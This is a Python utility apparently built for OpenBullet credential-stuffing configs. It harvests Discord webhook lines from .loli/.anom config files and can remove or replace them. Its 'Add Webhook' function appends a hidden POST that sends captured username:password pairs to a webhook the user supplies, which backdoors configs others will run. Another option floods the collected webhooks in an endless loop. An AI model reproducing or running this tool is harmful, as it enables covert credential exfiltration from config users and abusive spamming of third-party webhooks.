import os
import requests
import json
from threading import Thread, Lock, active_count
from colorama import init,Fore
from datetime import datetime
import io
import sys
from shutil import copyfile
from time import sleep

init(autoreset=True)

def GetWebhooksContentAndCopy():
    configs_list = os.listdir("Configs/")
    #line_num = 0
    webhook_file = open('discord_webhooks.txt','w+')
    webhooks_content = []
    if len(configs_list) > 0:
        for i in range(len(configs_list)):
            with open("Configs/{0}".format(configs_list[i]),encoding="utf8",errors='ignore') as f:
                lines = f.readlines()

                for line in lines:
                    #line_num += 1
                    if line.find('REQUEST POST "https://discordapp.com/api/webhooks/') >= 0:
                        PrintHitText("File: {0} WebHook found: {1}".format(configs_list[i],line.rstrip()))
                        try:
                            copyfile('Configs/{0}'.format(configs_list[i]), 'webhook_configs/{0}'.format(configs_list[i]))
                        except FileNotFoundError as e:
                            os.mkdir('webhook_configs')
                        webhook_file.write(line.split('REQUEST POST ')[-1].replace('"',''))
    else:
        PrintBadText('Folder is empty')
        sleep(2)

def GetWebhooksContent():
    configs_list = os.listdir("webhook_configs/")
    #line_num = 0
    webhook_file = open('discord_webhooks.txt','w+')
    webhooks_content = []
    if len(configs_list) > 0:
        for i in range(len(configs_list)):
            with open("webhook_configs/{0}".format(configs_list[i]),encoding="utf8",errors='ignore') as f:
                lines = f.readlines()

                for line in lines:
                    #line_num += 1
                    if line.find('REQUEST POST "https://discordapp.com/api/webhooks/') >= 0:
                        PrintHitText("File: {0} WebHook found: {1}".format(configs_list[i],line.rstrip()))
                        webhooks_content.append(line.rstrip())
    else:
        PrintBadText('Folder is empty')
        sleep(2)

    return webhooks_content
    
def ReadWebhooks():
    with open('discord_webhooks.txt','r') as f:
        content = [line.rstrip('\n') for line in f]
        return content

def WebhookSpamMethod(message,webhook):
    message_to_send = {'content':message}

    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Pragma':'no-cache',
        'Accept':'*/*',
        'Content-Type':'application/json'
    }

    payload = json.dumps(message_to_send)
    response = requests.post(webhook,data=payload,headers=headers)

    if response.text == "":
        PrintHitText('Message: {0} sent'.format(message))
    elif "You are being rate limited." in response.text:
        PrintBadText('You are rate limited')
    else:
        PrintBadText('Something went wrong')

def WebhookSpam():
    lock = Lock()
    message = str(input("Your message to spam: "))
    while True:
        for webhook in ReadWebhooks():
            lock.acquire()
            Thread(target=WebhookSpamMethod(message,webhook)).start()
            lock.release()

def AddWebhookToConfigs():
    configs_list = os.listdir("Configs/")
    webhook = str(input("Webhook: "))
    message_to_send = '"{\\"content\\":\\">>> ```<USER>:<PASS>```\\"}"'
    if len(configs_list) > 0:
        for i in range(len(configs_list)):
            with open("Configs/{0}".format(configs_list[i]),encoding="utf8",errors='ignore',mode='a') as f:
                if (configs_list[i].split('.')[-1] == 'loli') or (configs_list[i].split('.')[-1] == 'anom'):
                    f.seek(0, io.SEEK_END)
                    f.write('\nREQUEST POST "{0}"\n CONTENT {1}\n CONTENTTYPE "application/json"\n HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"\n HEADER "Pragma: no-cache"\n HEADER "Accept: */*" 	'.format(webhook,message_to_send))
                    PrintHitText('File: {0} added Webhook: {1}'.format(configs_list[i],webhook))
    else:
        PrintBadText('Folder is empty')
        sleep(2)

def replaceAll(file,searchExp,replaceExp):
    try:
        if (file.split('.')[-1] == 'loli') or (file.split('.')[-1] == 'anom'):
            with open(file,'r+') as f:
                lines = f.readlines()
                f.seek(0)
                for line in lines:
                    if searchExp in line:

                        line = line.replace(searchExp,replaceExp)
                    f.write(line)
                f.truncate()
    except UnicodeDecodeError as e:
        pass

def removeAll(file,searchExp):
    try:
        if (file.split('.')[-1] == 'loli') or (file.split('.')[-1] == 'anom'):
            with open(file, "r+") as f:
                lines = f.readlines()
                f.seek(0)
                for line in lines:
                    if searchExp not in line:
                        f.write(line)
                f.truncate()
    except UnicodeDecodeError as e:
        pass
    
        
    

def ReplaceWebhook():
    configs_list = os.listdir("webhook_configs/")
    webhooks = GetWebhooksContent()
    #print(webhooks)
    webhook = str(input("Enter your webhook: "))
    if len(configs_list) > 0:
        for i in range(len(configs_list)):
            replaceAll('webhook_configs/{0}'.format(configs_list[i]),webhooks[i],f'REQUEST POST "{webhook}"')
    else:
        PrintBadText('Folder is empty')
        sleep(2)
                
                        

def RemoveWebhook():
    configs_list = os.listdir("webhook_configs/")
    webhooks = GetWebhooksContent()
    #print(webhooks)
    if len(configs_list) > 0:
        for i in range(len(configs_list)):
            removeAll('webhook_configs/{0}'.format(configs_list[i]),webhooks[i])
    else:
        PrintBadText('Folder is empty')
        sleep(2)
 
def RemoveWebhookDuplications():
    list_of_webhooks = list(ReadWebhooks())
    if len(list_of_webhooks) > 0:
        list_size_with_dupes = len(list_of_webhooks)

        PrintBadText('Started size: {0}'.format(list_size_with_dupes))

        list_of_webhooks = set(list_of_webhooks)
        list_size_without_dupes = len(list_of_webhooks)

        webhook_file = open("discord_webhooks.txt","w+")

        for line in list_of_webhooks:
            webhook_file.write(line+"\n")
        webhook_file.close()

        PrintHitText('End size: {0}'.format(list_size_without_dupes))
        sleep(2)
    else:
        PrintBadText('Folder is empty')
        sleep(2)
    

def clear():
    if os.name == 'posix':
        os.system('clear')
    elif os.name in ('ce', 'nt', 'dos'):
        os.system('cls')
    else:
        print("\n") * 120

def PrintText(text):
    date = datetime.now()
    curr_date = date.strftime("[%H:%M:%S]")
    print('{0} {1}'.format(Fore.GREEN+curr_date,Fore.WHITE+text))

def PrintHitText(text):
    date = datetime.now()
    curr_date = date.strftime("[%H:%M:%S]")
    print('{0} {1}'.format(Fore.GREEN+curr_date,Fore.LIGHTGREEN_EX+text))

def PrintBadText(text):
    date = datetime.now()
    curr_date = date.strftime("[%H:%M:%S]")
    print('{0} {1}'.format(Fore.GREEN+curr_date,Fore.RED+text))

def Menu():
    os.system("title One Man Builds OpenBullet Config Tool")
    clear()
    print(Fore.RESET+'')
    print('[1] Get Discord Webhooks\n[2] Remove Duplicated Webhooks\n[3] Spam Discord Webhooks\n[4] Remove Webhook from configs\n[5] Add Webhook to configs\n[6] Replace Webhooks')
    print('')
    option = int(input('Choose something: '))
    if option == 1:
        GetWebhooksContentAndCopy()
        Menu()
    elif option == 2:
        RemoveWebhookDuplications()
        Menu()
    elif option == 3:
        WebhookSpam()
    elif option == 4:
        RemoveWebhook()
        Menu()
    elif option == 5:
        AddWebhookToConfigs()
        Menu()
    elif option == 6:
        ReplaceWebhook()
        Menu()
    else:
        GetWebhooksContent()
        Menu()

if __name__ == "__main__":
    Menu()